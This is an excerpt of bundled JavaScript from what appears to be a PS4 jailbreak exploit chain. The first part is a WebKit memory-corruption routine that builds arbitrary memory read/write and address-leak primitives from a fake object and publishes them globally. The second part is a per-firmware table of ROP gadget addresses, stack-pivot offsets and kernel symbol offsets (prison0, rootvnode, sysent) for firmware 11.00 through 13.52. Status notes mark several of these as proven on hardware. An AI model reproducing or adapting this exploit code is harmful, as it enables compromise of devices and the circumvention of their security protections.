    if (pairStatus.promoted)
      throw new Error("mem.promote: already promoted");
    if (carrier === null || typeof carrier.aim !== "function")
      throw new TypeError("mem.promote: no carrier");
    if (fakeCellReleased())
      throw new Error("mem.promote: core.js already released the fake cell");
    const fake = carrier;
    const profile2 = fake.profile;
    if (!profile2 || typeof profile2.vectorOffset !== "number" || typeof profile2.butterflyOffset !== "number" || typeof profile2.inlineSlotOffset !== "number")
      throw new TypeError("mem.promote: carrier has no layout profile");
    if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress) || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress) || fake.fakeAddress - fake.hostAddress !== profile2.inlineSlotOffset)
      throw new TypeError(`mem.promote: the fake cell's address is unusable (host=${fake.hostAddress} fake=${fake.fakeAddress})`);
    const VECTOR_OFF = profile2.vectorOffset;
    const LENGTH_OFF = VECTOR_OFF + 8;
    const MODE_OFF = LENGTH_OFF + 4;
    const BUTTERFLY_OFF = profile2.butterflyOffset;
    pairStatus.vectorOffset = VECTOR_OFF;
    pairStatus.lengthOffset = LENGTH_OFF;
    pairStatus.modeOffset = MODE_OFF;
    pairStatus.butterflyOffset = BUTTERFLY_OFF;
    let committed = false;
    let rebound = false;
    try {
      note("PAIR-BEGIN", `window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);
      const mainRecord = carrierHeaderCopy();
      const mainHomeVector = carrierHomeVector();
      if (!(mainRecord instanceof Uint8Array) || mainRecord.length < PAIR_HEADER_BYTES)
        throw new Error("mem.promote: core.js's carrier record is the wrong shape");
      const recordVector = low48At2(mainRecord, VECTOR_OFF);
      pairStatus.mainVector = toI64(mainHomeVector);
      pairStatus.mainRecordVector = toI64(recordVector);
      pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
      pairStatus.structureID = u32At(mainRecord, 0);
      note("PAIR-MAIN-RECORD", `home=0x${pairStatus.mainVector.toString()}-record=0x${pairStatus.mainRecordVector.toString()}-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`);
      if (recordVector !== mainHomeVector)
        throw new Error(`mem.promote: profile.vectorOffset disagrees with the recorded home vector (record 0x${pairStatus.mainRecordVector.toString()} vs home 0x${pairStatus.mainVector.toString()})`);
      if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
        throw new Error(`mem.promote: the recorded home vector is implausible (0x${pairStatus.mainVector.toString()})`);
      if (pairStatus.mainWindow !== fake.windowBytes)
        throw new Error(`mem.promote: the record's m_length (${pairStatus.mainWindow}) is not the carrier window (${fake.windowBytes}) -- LENGTH_OFF does not hold on main`);
      mainView = fake.view;
      retained.push(mainView);
      if (!(mainView instanceof Uint8Array) || mainView.length !== fake.windowBytes || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
        throw new Error("mem.promote: the carrier's view is not what core.js described");
      pairStatus.fakeAddress = toI64(fake.fakeAddress);
      pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
      note("PAIR-FAKE-BUTTERFLY", `host=0x${toI64(fake.hostAddress).toString()}-fake=0x${pairStatus.fakeAddress.toString()}-butterfly=0x${pairStatus.fakeButterfly.toString()}`);
      workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
      workerView = new Uint8Array(workerBuffer);
      workerMirror = new Uint8Array(workerBuffer);
      retained.push(workerBuffer, workerView, workerMirror);
      workerMirror[0] = HOME_BYTE;
      for (let i = 0; i < 8; ++i)
        workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
      if (workerView[0] !== HOME_BYTE)
        throw new Error("mem.promote: workerView does not alias workerMirror");
      for (let i = 0; i < 8; ++i)
        mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
      for (let i = 0; i < 8; ++i) {
        if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
          throw new Error("mem.promote: main's magic did not read back through its own JS view -- the carrier is not at home");
      }
      const mainAddr = addrNumber(leakval(mainView));
      const workerAddr = addrNumber(leakval(workerView));
      pairStatus.mainAddress = toI64(mainAddr);
      pairStatus.workerAddress = toI64(workerAddr);
      note("PAIR-CELLS", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}`);
      if (mainAddr === workerAddr)
        throw new Error("mem.promote: main and worker leaked the same cell");
      if (mainAddr % 16 !== 0 || workerAddr % 16 !== 0)
        throw new Error("mem.promote: a leaked cell is not atom-aligned");
      const fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
      pairStatus.mainCellFromFakeSlot = fromFakeSlot;
      note("PAIR-MAIN-CELL", `fake-m_vector=0x${fromFakeSlot.toString()}-leakval=0x${pairStatus.mainAddress.toString()}-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`);
      if (fromFakeSlot.low !== pairStatus.mainAddress.low || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
        throw new Error(`mem.promote: main CELL identity failed -- the fake cell's m_vector slot holds 0x${fromFakeSlot.toString()} but leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`);
      proveMagic(
        note,
        "main",
        "mainIdentity",
        mainHomeVector + MAIN_IDENT_OFFSET,
        mainMagic,
        `home=0x${pairStatus.mainVector.toString()}-cell=0x${pairStatus.mainAddress.toString()}-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`
      );
      readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
      const workerVector = low48At2(workerHeader, VECTOR_OFF);
      const workerButterfly = low48At2(workerHeader, BUTTERFLY_OFF);
      pairStatus.mode = workerHeader[MODE_OFF];
      pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
      pairStatus.workerVector = toI64(workerVector);
      pairStatus.workerButterfly = toI64(workerButterfly);
      note("PAIR-WORKER-HEADER", `sid=0x${u32At(workerHeader, 0).toString(16)}-vector=0x${pairStatus.workerVector.toString()}-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}-butterfly=0x${pairStatus.workerButterfly.toString()}`);
      const gate = u32At(workerHeader, 0) === pairStatus.structureID && (workerHeader[7] === 0 || workerHeader[7] === 1) && pairStatus.workerWindow === WORKER_BUFFER_SIZE && workerHeader[MODE_OFF] === mainRecord[MODE_OFF] && workerHeader[MODE_OFF + 1] === 0 && workerHeader[MODE_OFF + 2] === 0 && workerHeader[MODE_OFF + 3] === 0 && canonical48(workerHeader, BUTTERFLY_OFF) && workerButterfly > 4294967296 && workerButterfly % 8 === 0 && canonical48(workerHeader, VECTOR_OFF) && fake.validate(workerVector) && workerVector % 8 === 0 && workerVector !== mainHomeVector;
      if (!gate)
        throw new Error(`mem.promote: header gate failed worker-len=${pairStatus.workerWindow} worker-mode=${workerHeader[MODE_OFF]} main-mode=${mainRecord[MODE_OFF]} worker-sid=${u32At(workerHeader, 0)} main-sid=${pairStatus.structureID} worker-vector=0x${pairStatus.workerVector.toString()} worker-butterfly=0x${pairStatus.workerButterfly.toString()} main-home=0x${pairStatus.mainVector.toString()}`);
      proveMagic(
        note,
        "worker",
        "workerIdentity",
        workerVector + PAIR_IDENT_OFFSET,
        workerMagic,
        `vector=0x${pairStatus.workerVector.toString()}-cell=0x${pairStatus.workerAddress.toString()}-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`
      );
      note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");
      for (let i = 0; i < 8; ++i)
        workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
      for (let i = 0; i < 4; ++i)
        workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];
      note("PAIR-COMMIT", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-next=aim-without-restore`);
      aimFor(workerAddr, PAIR_HEADER_BYTES);
      committed = true;
      pairStatus.committed = true;
      for (let i = 0; i < 4; ++i)
        mainView[LENGTH_OFF + i] = 255;
      pairStatus.workerLength = workerView.length;
      if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
        throw new Error(`mem.promote: the m_length write did not land -- worker.length reads ${pairStatus.workerLength}`);
      if (workerMirror.length !== WORKER_BUFFER_SIZE)
        throw new Error("mem.promote: the mirror was widened too -- the write went somewhere structural, not to worker's m_length");
      if (workerView[0] !== HOME_BYTE)
        throw new Error("mem.promote: worker no longer sees its own buffer");
      if (mainView[MODE_OFF] !== workerHeader[MODE_OFF] || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0 || mainView[MODE_OFF + 3] !== 0)
        throw new Error("mem.promote: m_mode was disturbed by the widening");
      for (let i = 0; i < 8; ++i) {
        if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
          throw new Error("mem.promote: worker's m_vector moved during the widening");
      }
      note("PAIR-WIDENED", `length=0x${WORKER_LENGTH_MAX.toString(16)}-mode=0x${pairStatus.mode.toString(16)}`);
      pairVectorOffset = VECTOR_OFF;
      carrier = buildPairCarrier(fake);
      rebound = true;
      readInto(identityBytes2, workerVector + PAIR_IDENT_OFFSET, 8);
      if (!sameBytes2(identityBytes2, workerMagic, 8))
        throw new Error(`mem.promote: read through the pair returned ${hexOf(identityBytes2, 8)}, expected ${hexOf(workerMagic, 8)}`);
      write8(
        workerVector + PAIR_IDENT_OFFSET,
        new int64(218893066, 67305985)
      );
      const back = [10, 11, 12, 13, 1, 2, 3, 4];
      for (let i = 0; i < 8; ++i) {
        if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
          throw new Error(`mem.promote: write through the pair failed at byte ${i}`);
      }
      for (let i = 0; i < 8; ++i)
        workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
      const workerAgain = addrNumber(leakval(workerView));
      pairStatus.leakvalAgrees = workerAgain === workerAddr;
      if (!pairStatus.leakvalAgrees)
        throw new Error(`mem.promote: leakval through the pair disagrees (0x${toI64(workerAgain).toString()} vs 0x${pairStatus.workerAddress.toString()})`);
      const mv = read8(mainAddr + VECTOR_OFF);
      if (mv.low !== pairStatus.workerAddress.low || mv.hi !== pairStatus.workerAddress.hi)
        throw new Error(`mem.promote: main.m_vector reads 0x${mv.toString()}, expected worker's cell 0x${pairStatus.workerAddress.toString()}`);
      if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
        throw new Error("mem.promote: main's own m_length was disturbed");
      note("PAIR-REPROVED", `main-m_vector=0x${mv.toString()}-leakval=0x${toI64(workerAgain).toString()}`);
      note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
      const rel = releaseFakeCell();
      pairStatus.released = rel.released;
      pairStatus.historyCleared = !!rel.historyCleared;
      if (!fakeCellReleased())
        throw new Error("mem.promote: core.js did not release the fake cell");
      if (fake.assertHome() !== false)
        throw new Error("mem.promote: core.js's carrier still reports itself live");
      pairStatus.promoted = true;
      pairStatus.state = "pair";
      pairStatus.error = null;
      note("PAIR-UP", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-home=0x${pairStatus.mainVector.toString()}-mode=0x${pairStatus.mode.toString(16)}-sid=0x${pairStatus.structureID.toString(16)}-released=${pairStatus.released.length}-history-cleared=${pairStatus.historyCleared}`);
      return pairStatus;
    } catch (error) {
      pairStatus.failedAt = pairStatus.stage;
      pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;
      let clean = true;
      if (committed) {
        pairStatus.rolledBack = true;
        try {
          for (let i = 0; i < 8; ++i)
            mainView[VECTOR_OFF + i] = workerOriginalVector[i];
          for (let i = 0; i < 4; ++i)
            mainView[LENGTH_OFF + i] = workerOriginalLength[i];
        } catch {
          clean = false;
        }
        try {
          fake.restore();
        } catch {
          clean = false;
        }
        try {
          if (!(workerView.length === WORKER_BUFFER_SIZE && workerMirror.length === WORKER_BUFFER_SIZE && workerView[0] === HOME_BYTE && fake.assertHome() === true))
            clean = false;
        } catch {
          clean = false;
        }
        pairStatus.rollbackClean = clean;
      }
      try {
        pairStatus.mainAtHome = fake.assertHome();
      } catch {
        pairStatus.mainAtHome = null;
      }
      pairStatus.promoted = false;
      pairStatus.fallback = true;
      pairStatus.state = committed && !clean ? "broken" : "fake";
      if (pairStatus.state === "broken")
        carrier = brokenCarrier(pairStatus.error);
      else if (rebound)
        carrier = fake;
      pairVectorOffset = -1;
      workerView = null;
      workerMirror = null;
      workerBuffer = null;
      mainView = null;
      note("PAIR-FALLBACK", `state=${pairStatus.state}-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}-main-at-home=${pairStatus.mainAtHome}-at=${pairStatus.failedAt}-${pairStatus.error}`);
      throw error;
    }
  }
  function installWindowP(c, options) {
    if (!c || typeof c.aim !== "function")
      throw new TypeError("mem: not a carrier");
    carrier = c;
    const prim = {
      read1,
      read2,
      read4,
      read8,
      write1,
      write2,
      write4,
      write8,
      leakval
    };
    globalThis.p = prim;
    const opts = options || {};
    if (opts.promote === false) {
      pairStatus.state = "disabled";
      pairStatus.stage = "disabled";
      pairStatus.error = "promotion disabled by the caller (negative control)";
      return prim;
    }
    try {
      promoteToRealPair(opts.onEvent);
    } catch {
      if (pairStatus.state === "broken") {
        globalThis.p = void 0;
        throw new Error(`mem: the promotion failed AND its rollback did not verify -- window.p has been WITHDRAWN rather than published mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`);
      }
    }
    return prim;
  }

  // slopkit/ps4_offsets.js
  var PS4 = {
    "11.00": {
      fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",
      k_idt_rsvd: 2958384,
      wk_expm1_builtin: 35209008,
      wk_JSFunction_m_function: 40,
      wk_CSSFontFace_vtable: 56785576,
      wk___imp___error: 57547880,
      k__error: 13168,
      wk___imp_strerror: 57547928,
      c_strerror: 68864,
      wk_POP_RDI_RET: 219040,
      wk_POP_RAX_RET: 321193,
      wk_MOV_RDI_RSI_30_CALL: 38645336,
      wk_POP_RAX_MOV_RAX_JMP_18: 18701651,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 3086480,
      wk_MOV_RDI_RAX_8_CALL_20: 268929,
      wk_MOV_RDX_RAX_18_CALL_10: 9502694,
      wk_PUSH_RDX_POP_RSP_RET: 30171258,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 38875,
      wk_LEAVE_RET: 204701,
      wk_POP_RSI_RET: 149986,
      wk_POP_RDX_RET: 68881,
      wk_POP_RCX_RET: 464407,
      wk_POP_R8_RET: 938914,
      wk_POP_R9_RET: 6554529,
      pivot_view_sp: 24,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      k_getpid: 111232,
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 8372847,
      k_sysent_661: 17863504,
      k_jmp_rsi: 465441
    },
    "11.50": {
      fw_status: "state=proven step4q=90/0 reboot=0 webkit=step7-20/20-x2 kernel_rvas=untested-vs-dump kstr_residue=0x318",
      wk_expm1_builtin: 39353296,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 38031937,
      wk_POP_RSI_RET: 38812830,
      wk_POP_RDX_RET: 38599202,
      wk_POP_RCX_RET: 38567615,
      wk_POP_RAX_RET: 39145023,
      wk_POP_R8_RET: 37467325,
      wk_POP_R9_RET: 29543841,
      wk_LEAVE_RET: 37500816,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 38034714,
      wk_MOV_RDI_RSI_30_CALL: 43387384,
      wk_POP_RAX_MOV_RAX_JMP_18: 29932483,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 23351920,
      wk_MOV_RDI_RAX_8_CALL_20: 31717269,
      wk_MOV_RDX_RAX_18_CALL_10: 31367530,
      wk_PUSH_RDX_POP_RSP_RET: 44818442,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63687832,
      k__error: 99264,
      wk___imp_pthread_create: 63691704,
      k_pthread_create: 41424,
      k_stubs: {
        3: 180592,
        4: 178384,
        5: 178544,
        6: 185888,
        20: 183152,
        23: 177904,
        24: 185824,
        25: 177360,
        30: 182736,
        54: 184304,
        92: 177744,
        97: 184400,
        98: 177648,
        104: 185216,
        105: 177296,
        106: 185472,
        118: 176880,
        135: 180864,
        240: 185536,
        331: 181936,
        432: 177424,
        466: 183408,
        487: 178816,
        488: 179472,
        538: 177200,
        539: 177392,
        544: 179888,
        545: 182832,
        632: 184464,
        633: 186432,
        662: 183472,
        663: 181216,
        664: 186176,
        666: 185664,
        669: 179696
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 7881496,
      k_sysent_661: 17868640,
      k_jmp_rsi: 459989
    },
    "12.00": {
      fw_status: "state=UNTESTED-on-hardware webkit=offline-from-sprx anchor=findcaller-validated-on-11.50 kernel_rvas=verified-vs-kernel_1202.elf kpatch=10/10-sites-verified",
      k_idt_rsvd: 1842432,
      wk_expm1_builtin: 39342224,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 299055,
      wk_POP_RSI_RET: 69175,
      wk_POP_RDX_RET: 3962,
      wk_POP_RCX_RET: 343051,
      wk_POP_RAX_RET: 143187,
      wk_POP_R8_RET: 143186,
      wk_POP_R9_RET: 6338241,
      wk_LEAVE_RET: 71715,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 177611,
      wk_PUSH_RDX_POP_RSP_RET: 44806202,
      wk_MOV_RDI_RSI_30_CALL: 43375832,
      wk_POP_RAX_MOV_RAX_JMP_18: 9324659,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2645520,
      wk_MOV_RDI_RAX_8_CALL_20: 7109389,
      wk_MOV_RDX_RAX_18_CALL_10: 13860042,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63687752,
      k__error: 170432,
      wk___imp_pthread_create: 63691648,
      k_pthread_create: 151040,
      k_stubs: {
        3: 180576,
        4: 178368,
        5: 178528,
        6: 185872,
        20: 183136,
        23: 177888,
        24: 185808,
        25: 177344,
        30: 182720,
        54: 184288,
        92: 177728,
        97: 184384,
        98: 177632,
        104: 185200,
        105: 177280,
        106: 185456,
        118: 176864,
        135: 180848,
        240: 185520,
        331: 181920,
        432: 177408,
        466: 183392,
        487: 178800,
        488: 179456,
        538: 177184,
        539: 177376,
        544: 179872,
        545: 182816,
        632: 184448,
        633: 186416,
        662: 183456,
        663: 181200,
        664: 186160,
        666: 185648,
        669: 179680
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 7882648,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681
    },
    "13.00": {
      fw_status: "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",
      k_idt_rsvd: 1842496,
      wk_expm1_builtin: 39348352,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 377984,
      wk_POP_RSI_RET: 451678,
      wk_POP_RDX_RET: 1230266,
      wk_POP_RCX_RET: 113374,
      wk_POP_RAX_RET: 66820,
      wk_POP_R8_RET: 635665,
      wk_POP_R9_RET: 1953713,
      wk_LEAVE_RET: 99063,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 21643,
      wk_PUSH_RDX_POP_RSP_RET: 44813482,
      wk_MOV_RDI_RSI_30_CALL: 43383112,
      wk_POP_RAX_MOV_RAX_JMP_18: 31033827,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2472672,
      wk_MOV_RDI_RAX_8_CALL_20: 4850694,
      wk_MOV_RDX_RAX_18_CALL_10: 32258778,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63671496,
      k__error: 156704,
      wk___imp_pthread_create: 63675392,
      k_pthread_create: 65808,
      k_stubs: {
        3: 180592,
        4: 178384,
        5: 178544,
        6: 185888,
        20: 183152,
        23: 177904,
        24: 185824,
        25: 177360,
        30: 182736,
        54: 184304,
        92: 177744,
        97: 184400,
        98: 177648,
        104: 185216,
        105: 177296,
        106: 185472,
        118: 176880,
        135: 180864,
        240: 185536,
        331: 181936,
        432: 177424,
        466: 183408,
        487: 178816,
        488: 179472,
        538: 177200,
        539: 177392,
        544: 179888,
        545: 182832,
        632: 184464,
        633: 186432,
        662: 183472,
        663: 181216,
        664: 186176,
        666: 185664,
        669: 179696
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_kl_lock: 945184,
      k_evf_cv: 0,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681,
      k_oid_kern_file: 27457696,
      k_oid_maxfilesperproc: 27457872,
      k_oid_maxprocperuid: 27507336,
      k_oid_maxfiles: 27457960,
      k_arg1_maxfilesperproc: 36488316,
      k_arg1_maxprocperuid: 36488312,
      k_arg1_maxfiles: 36488308,
      k_sysctl_handle_int: 4169872,
      k_prison0: 2764e4,
      k_rootvnode: 34827920,
      k_sysent: 17836912
    },
    "12.50": {
      fw_status: "state=UNTESTED-on-hardware webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) anchor=findcaller-offline (self-check reproduces the known 11.50 and 12.00 anchors) kernel_rvas=asserted-by-supplied-table STILL-UNVERIFIED (no 12.50 kernel dump) but CORROBORATED: all three byte-verified in the 13.00 hardware dump AND in kernel_1202.elf at the identical RVAs, and 12.02<->13.00 share their first megabyte 96.7% at ZERO shift (11.00<->12.02 is 3.7%), so 12.50/12.52 sit between two builds whose low text does not move kpatch=1250.bin bug=poops",
      wk_expm1_builtin: 39342352,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 299055,
      wk_POP_RSI_RET: 69175,
      wk_POP_RDX_RET: 487914,
      wk_POP_RCX_RET: 384761,
      wk_POP_RAX_RET: 143187,
      wk_POP_R8_RET: 143186,
      wk_POP_R9_RET: 6338241,
      wk_LEAVE_RET: 490666,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 177611,
      wk_PUSH_RDX_POP_RSP_RET: 44806330,
      wk_MOV_RDI_RSI_30_CALL: 43375960,
      wk_POP_RAX_MOV_RAX_JMP_18: 9324659,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2645520,
      wk_MOV_RDI_RAX_8_CALL_20: 7109389,
      wk_MOV_RDX_RAX_18_CALL_10: 13860042,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63654984,
      k__error: 55760,
      wk___imp_pthread_create: 63658880,
      k_pthread_create: 146720,
      k_stubs: {
        3: 180576,
        4: 178368,
        5: 178528,
        6: 185872,
        20: 183136,
        23: 177888,
        24: 185808,
        25: 177344,
        30: 182720,
        54: 184288,
        92: 177728,
        97: 184384,
        98: 177632,
        104: 185200,
        105: 177280,
        106: 185456,
        118: 176864,
        135: 180848,
        240: 185520,
        331: 181920,
        432: 177408,
        466: 183392,
        487: 178800,
        488: 179456,
        538: 177184,
        539: 177376,
        544: 179872,
        545: 182816,
        632: 184448,
        633: 186416,
        662: 183456,
        663: 181200,
        664: 186160,
        666: 185648,
        669: 179680
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 0,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681,
      k_kl_lock: 945184
    }
  };
  PS4["13.50"] = {
    fw_status: "state=663-JB-PROVEN-on-hw webkit=13.00-module libkernel=13.50-stubs kernel_rvas=MEASURED-from-kernel_1350.elf (kderive 16/16, adversarial 16/16 GO) kpatch=1350.bin-BUILT-10/10-neg-controls-pass-UNTESTED-on-hw bug=663",
    wk_expm1_builtin: 39348352,
    wk_JSFunction_m_function: 40,
    wk_POP_RDI_RET: 377984,
    wk_POP_RSI_RET: 451678,
    wk_POP_RDX_RET: 1230266,
    wk_POP_RCX_RET: 113374,
    wk_POP_RAX_RET: 66820,
    wk_POP_R8_RET: 635665,
    wk_POP_R9_RET: 1953713,
    wk_LEAVE_RET: 99063,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 21643,
    wk_PUSH_RDX_POP_RSP_RET: 44813482,
    wk_MOV_RDI_RSI_30_CALL: 43383112,
    wk_POP_RAX_MOV_RAX_JMP_18: 31033827,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 2472672,
    wk_MOV_RDI_RAX_8_CALL_20: 4850694,
    wk_MOV_RDX_RAX_18_CALL_10: 32258778,
    pivot_view_sp: 56,
    wk_ArrayBuffer_m_impl: 16,
    wk_ArrayBuffer_m_contents_m_data: 16,
    wk___imp___error: 63671496,
    k__error: 106736,
    wk___imp_pthread_create: 63675392,
    k_pthread_create: 137104,
    k_stubs: {
      3: 180592,
      4: 178384,
      5: 178544,
      6: 185888,
      20: 183152,
      23: 177904,
      24: 185824,
      25: 177360,
      30: 182736,
      54: 184304,
      92: 177744,
      97: 184400,
      98: 177648,
      104: 185216,
      105: 177296,
      106: 185472,
      118: 176880,
      135: 180864,
      240: 185536,
      331: 181936,
      432: 177424,
      466: 183408,
      487: 178816,
      488: 179472,
      538: 177200,
      539: 177392,
      544: 179888,
      545: 182832,
      632: 184464,
      633: 186432,
      662: 183472,
      663: 181216,
      664: 186176,
      666: 185664,
      669: 179696
    },
    k_scan_stage1: 262144,
    k_scan_stage2: 393216,
    k_idt_rsvd: 1842528,
    k_sysctl_handle_int: 4170976,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7884312,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1350.bin"
  };
  PS4["13.52"] = Object.assign({}, PS4["13.50"], {
    alias_of: "13.50",
    k_idt_rsvd: 1842688,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_sysctl_handle_int: 4172e3,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_jmp_rsi: 317136,
    k_kl_lock: 945248,
    k_evf_cv: 7885352,
    kpatch: "1352.bin",
    fw_status: "state=663-LIVE-on-hardware shares=13.50 (webkit+libkernel) kernel_rvas=MEASURED-from-kernel_1352.elf (kdump5 tier1 36MB pass=39/0, kderive 16/16 recipes) kpatch=1352.bin-24-sites-verified-OFFLINE-ONLY bug=663"
  });
  PS4["13.02"] = Object.assign({}, PS4["13.00"], {
    alias_of: "13.00",
    k_idt_rsvd: 1842512,
    k_sysctl_handle_int: 4169888,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7883224,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1302.bin",
    fw_status: "state=663-JB+KPATCH-PROVEN-on-hw-pass=51 shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=MEASURED-from-kernel_1302.elf (16/16 GO) same-kernel-as=13.04 kpatch=1302.bin-HW-PROVEN-KEXEC-rc0 bug=663"
  });
  PS4["13.04"] = Object.assign({}, PS4["13.00"], {
    alias_of: "13.00",
    k_idt_rsvd: 1842512,
    k_sysctl_handle_int: 4169888,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7883224,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1302.bin",
    fw_status: "state=663-JB+KPATCH-via-13.02(pass=51) shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=SAME-KERNEL-AS-13.02 (measured from kernel_1302.elf, 16/16 GO) kpatch=1302.bin-shared-HW-PROVEN bug=663"
  });
  PS4["12.02"] = Object.assign({}, PS4["12.00"], {
    alias_of: "12.00",
    fw_status: "state=UNTESTED-on-hardware shares=12.00 kernel_rvas=verified-vs-kernel_1202.elf (this firmware) kpatch=1200.bin-10-sites-verified bug=lapse",
    kpatch: "1200.bin"
  });
  PS4["12.52"] = Object.assign({}, PS4["12.50"], {
    alias_of: "12.50",
    fw_status: "state=UNTESTED-on-hardware shares=12.50 webkit=assumed-identical-to-12.50 (no 12.52 module dump) kernel_rvas=STILL-UNVERIFIED but corroborated via 12.02+13.00 dumps kpatch=1250.bin bug=poops",
    kpatch: "1250.bin"
  });
  PS4["11.52"] = Object.assign({}, PS4["11.50"], {
    alias_of: "11.50",
    fw_status: "state=UNTESTED-on-hardware shares=11.50 webkit=assumed-identical-to-11.50 kernel_rvas=untested-vs-dump kpatch=1150.bin",
    kpatch: "1150.bin"
  });
